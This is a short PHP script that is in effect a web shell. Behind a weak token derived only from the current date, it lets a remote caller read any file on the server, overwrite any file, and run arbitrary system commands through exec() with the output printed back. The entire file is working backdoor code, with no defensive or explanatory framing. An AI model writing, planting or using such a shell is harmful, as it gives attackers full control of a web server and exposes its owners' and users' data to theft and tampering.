<?php

function auth() {
    return md5(base64_encode(date("Y-m-d")));
}

function get($name) {
    return isset($_REQUEST[$name]) ? $_REQUEST[$name] : '';
}

$token = get('token');
if ($token !== auth()) {
    $data = [];
    $data['data'] = ":(";
    echo json_encode($data);
    exit;
}

$action = get('action');

if ($action === 'open') {

    $res = $_REQUEST['res'];
    $data = [];
    if (is_file($res)) {
        $data['data'] = file_get_contents($res);
    } else {
        $data['data'] = 'File not found！';
    }
    echo json_encode($data);
    exit;
}

if ($action === 'save') {
    $res = $_REQUEST['res'];
    $m = $_REQUEST['data'];
    $data = [];
    if (is_file($res)) {
        $raw = file_get_contents($res);
        $backup = "backup" . DIRECTORY_SEPARATOR . md5($res) . "." . uniqid() . ".bak";
        file_put_contents($backup, $raw);
        file_put_contents($res, $m);
        $data['data'] = 'is over！';
    } else {
        $data['data'] = 'File not found！';
    }
    echo json_encode($data);
    exit;
}

if ($action === 'shell') {
    $res = $_REQUEST['res'];
    if ($res == '') {
        echo ":(";
        exit;
    }
    $o = [];
    exec($res, $o);
    print_r($o);
    exit;
}